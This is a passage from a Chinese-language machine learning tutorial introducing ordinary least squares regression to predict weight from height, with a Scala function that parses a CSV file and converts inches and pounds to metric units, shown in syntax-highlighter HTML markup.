&lt;h2&gt;根据身高预测体重（应用普通最小二乘法）&lt;/h2&gt;
&lt;p&gt;在这部分中，我们将介绍&lt;a href=&quot;http://en.wikipedia.org/wiki/Ordinary_least_squares&quot;&gt;普通最小二乘法&lt;/a&gt;，它是一种线性回归方法。因为这种方法十分强大，所以开始实例之前，有必要先了解回归与常见的陷阱。我们将在这部分介绍一部分这些问题，其他的相关问题我们已在欠拟合与过拟合这两小节中介绍过了。&lt;/p&gt;
&lt;p&gt;线性回归的基本思想是用一条“最优的”回归线来拟合数据点。注意这只对线性数据并且无过大异常值的情况才适用。如果你的数据不满足这种条件，那你可以尝试对数据进行操作，例如将数据取平方或取对数，直到满足适用条件。&lt;/p&gt;
&lt;p&gt;与往常一样，在一项工程开始时，首先要导入一个数据集。为此，我们提供了如下 &lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/OLS_Regression_Example_3.csv&quot;&gt;csv 文件&lt;/a&gt;以及读取文件用的代码：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061390297424344&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
  def getDataFromCSV(file: File): (Array[Array[Double]], Array[Double]) = {
    val source = scala.io.Source.fromFile(file)
    val data = source.getLines().drop(1).map(x =&amp;gt; getDataFromString(x)).toArray
    source.close()
    var inputData = data.map(x =&amp;gt; x._1)
    var resultData = data.map(x =&amp;gt; x._2)

    return (inputData,resultData)
  }

  def getDataFromString(dataString: String): (Array[Double], Double) = {

    //Split the comma separated value string into an array of strings
    //把用逗号分隔的数值字符串分解为一个字符串数组
    val dataArray: Array[String] = dataString.split(&#39;,&#39;)
    var person = 1.0

    if (dataArray(0) == &quot;&quot;Male&quot;&quot;) {
      person = 0.0
    }

    //Extract the values from the strings
    //从字符串中抽取数值
    //Since the data is in US metrics 
    //inch and pounds we will recalculate this to cm and kilo&#39;s
    //因数据是采用美制单位英寸和磅，我们要将它们转换为厘米和千克
    val data : Array[Double] = Array(person,dataArray(1).toDouble * 2.54)
    val weight: Double = dataArray(2).toDouble * 0.45359237

    //And return the result in a format that can later easily be used to feed to Smile
    //并以一定格式返回结果，使得该结果之后容易输入到Smile中处理
    return (data, weight)
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061390297424344-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061390297424344-33&quot;&gt;33&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-4&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;inputData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;resultData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;inputData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;resultData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Split the comma separated value string into an array of strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//把用逗号分隔的数值字符串分解为一个字符串数组&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;person&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-17&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Male&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;person&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-21&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Extract the values from the strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//从字符串中抽取数值&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Since the data is in US metrics &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//inch and pounds we will recalculate this to cm and kilo&#39;s&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061390297424344-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//因数据是采用美制单位英寸和磅，我们要将它们转换为厘米和千克&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061390297424344-27&quot;&gt;
